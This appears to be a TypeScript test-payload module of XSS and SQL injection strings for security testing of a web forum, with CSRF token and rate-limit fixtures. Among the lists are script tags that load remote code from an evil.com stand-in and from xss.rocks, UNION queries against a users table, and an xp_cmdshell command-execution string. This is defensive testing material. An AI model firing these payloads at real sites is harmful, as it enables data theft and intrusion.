/**
 * Security Test Payloads
 *
 * Common XSS and SQL injection payloads for security testing
 * All payloads are non-destructive and safe for testing
 */

/**
 * XSS Attack Payloads
 * Organized by attack type
 */
export const XSS_PAYLOADS = {
  /**
   * Basic script injection
   */
  scriptTags: [
    '<script>alert("XSS")</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script src="https://evil.com/xss.js"></script>',
    '<script>document.cookie</script>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  ],

  /**
   * Event handler injection
   */
  eventHandlers: [
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<div onclick="alert(1)">Click me</div>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<iframe onload=alert(1)>',
  ],

  /**
   * JavaScript URL schemes
   */
  javascriptUrls: [
    '<a href="javascript:alert(1)">Click</a>',
    '<iframe src="javascript:alert(1)">',
    '<form action="javascript:alert(1)">',
    '<object data="javascript:alert(1)">',
  ],

  /**
   * Data URL schemes
   */
  dataUrls: [
    '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    '<object data="data:text/html,<script>alert(1)</script>">',
  ],

  /**
   * CSS injection
   */
  cssInjection: [
    '<style>body { background: url("javascript:alert(1)") }</style>',
    '<div style="background: url(javascript:alert(1))">',
    '<link rel="stylesheet" href="javascript:alert(1)">',
  ],

  /**
   * Iframe injection
   */
  iframeInjection: [
    '<iframe src="javascript:alert(1)">',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    '<iframe srcdoc="<script>alert(1)</script>">',
  ],

  /**
   * SVG-based XSS
   */
  svgXss: [
    '<svg onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert(1)>',
  ],

  /**
   * Encoded payloads
   */
  encoded: [
    '%3Cscript%3Ealert(1)%3C/script%3E', // URL encoded
    '&#60;script&#62;alert(1)&#60;/script&#62;', // HTML entities
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e', // Unicode
    '&lt;script&gt;alert(1)&lt;/script&gt;', // HTML entities
  ],

  /**
   * Nested/obfuscated XSS
   */
  nested: [
    '<<script>alert(1)//<</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>',
  ],
};

/**
 * SQL Injection Payloads
 * All are safe for testing (no destructive operations)
 */
export const SQL_INJECTION_PAYLOADS = {
  /**
   * Basic OR-based injection
   */
  basicOr: ["' OR 1=1--", "' OR 'a'='a", "admin'--", "' OR '1'='1'--", "1' OR '1' = '1"],

  /**
   * UNION-based injection (information disclosure)
   */
  union: [
    "' UNION SELECT NULL--",
    "' UNION SELECT * FROM users--",
    "' UNION SELECT id, username, email FROM users--",
    "' UNION ALL SELECT NULL, NULL, NULL--",
  ],

  /**
   * Stacked queries (testing if multiple statements allowed)
   * NOTE: These are detection only, not actually executed
   */
  stacked: ["'; SELECT 1--", "'; WAITFOR DELAY '00:00:05'--", "'; EXEC xp_cmdshell('dir')--"],

  /**
   * Comment-based injection
   */
  comments: ["'--", "' /*", "'#", "' -- -", "';--"],

  /**
   * Boolean-based blind injection
   */
  blind: ["' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b"],

  /**
   * Time-based blind injection
   * NOTE: These may cause delays in testing
   */
  timeBased: ["' AND SLEEP(5)--", "' OR SLEEP(5)--", "1; WAITFOR DELAY '00:00:05'--"],

  /**
   * FTS5-specific injection (for full-text search)
   */
  fts5: ['test*', 'test OR attack', 'test AND attack', 'NEAR(test attack)', '"test phrase"'],
};

/**
 * Get all XSS payloads as flat array
 */
export function getAllXSSPayloads(): string[] {
  return Object.values(XSS_PAYLOADS).flat();
}

/**
 * Get all SQL injection payloads as flat array
 */
export function getAllSQLPayloads(): string[] {
  return Object.values(SQL_INJECTION_PAYLOADS).flat();
}

/**
 * Get subset of XSS payloads for quick testing
 */
export function getQuickXSSPayloads(): string[] {
  return [
    XSS_PAYLOADS.scriptTags[0], // Basic script
    XSS_PAYLOADS.eventHandlers[0], // img onerror
    XSS_PAYLOADS.javascriptUrls[0], // javascript: URL
    XSS_PAYLOADS.dataUrls[0], // data: URL
    XSS_PAYLOADS.cssInjection[0], // CSS injection
  ];
}

/**
 * Get subset of SQL payloads for quick testing
 */
export function getQuickSQLPayloads(): string[] {
  return [
    SQL_INJECTION_PAYLOADS.basicOr[0], // ' OR 1=1--
    SQL_INJECTION_PAYLOADS.union[0], // UNION SELECT
    SQL_INJECTION_PAYLOADS.comments[0], // '--
  ];
}

/**
 * CSRF token patterns (for testing CSRF protection)
 */
export const CSRF_TEST_TOKENS = {
  missing: undefined,
  empty: '',
  invalid: 'invalid-token-12345',
  expired: 'expired-token-67890',
  malformed: '!!!invalid!!!',
};

/**
 * Rate limit test helpers
 */
export const RATE_LIMIT = {
  topicCreation: 5, // Max topics per minute
  replyCreation: 10, // Max replies per minute
  voting: 20, // Max votes per minute
};
